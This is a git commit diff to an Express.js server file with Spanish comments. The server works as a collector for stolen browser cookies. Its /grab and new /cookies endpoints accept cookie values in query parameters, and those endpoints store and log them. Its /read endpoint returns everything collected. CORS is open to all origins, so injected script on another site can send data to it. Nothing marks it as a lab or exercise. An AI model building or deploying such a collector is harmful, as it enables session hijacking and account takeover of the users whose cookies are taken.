d9c5d7f298cd0d66c65a29684a6f728ff7afbc61
Estiven <estivencamachops@gmail.com>
2024-10-21 17:46:02 +0200

    #try 9

--- index.js
+++ index.js
@@ -1,26 +1,39 @@
 const express = require('express');
-const app = express();
-const cors = require('cors');
-app.use(cors());
+const bodyParser = require('body-parser');
+const cors = require('cors'); // Importar cors
 
-let cookiesAlmacenadas = "";  // Aquí se almacenarán las cookies
+const app = express();
+let cookiesAlmacenadas = ""; // Variable para almacenar las cookies
+
+app.use(cors()); // Habilitar CORS para todas las rutas
+app.use(bodyParser.json());
 
 app.get('/', (req, res) => {
-    res.send('pagina principal: siuuu');
+    res.send('Página principal: siuuu');
 });
 
-// Almacena las cookies enviadas
 app.get('/grab', (req, res) => {
-    const data = req.query.data;
-    cookiesAlmacenadas += data + "; ";  // Acumula las cookies
-    res.send(data);  // Envía una respuesta con las cookies que se acaban de almacenar
+    const data = req.query.data;  // Obtener las cookies
+    cookiesAlmacenadas += " " + data; // Almacenar las cookies
+    res.send(data);
 });
 
-// Muestra todas las cookies almacenadas
 app.get('/read', (req, res) => {
-    res.send(cookiesAlmacenadas);  // Envía todas las cookies almacenadas
+    res.send(cookiesAlmacenadas); // Enviar las cookies almacenadas
 });
 
+app.get('/cookies', (req, res) => {
+    const cookies = req.query.cookies; // Obtener las cookies 
+    cookiesAlmacenadas = cookies; // Almacenar las cookies
+    console.log('Cookies recibidas:', cookies); 
+    res.send('Cookies recibidas correctamente'); 
+});
+
+//app.get('/show-cookies', (req, res) => {
+//    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
+//});
+
+// Iniciar el servidor
 app.listen(3000, () => {
-    console.log('Servidor escuchando en el puerto 3000');
+    console.log('Servidor funcionando en el puerto 3000');
 });
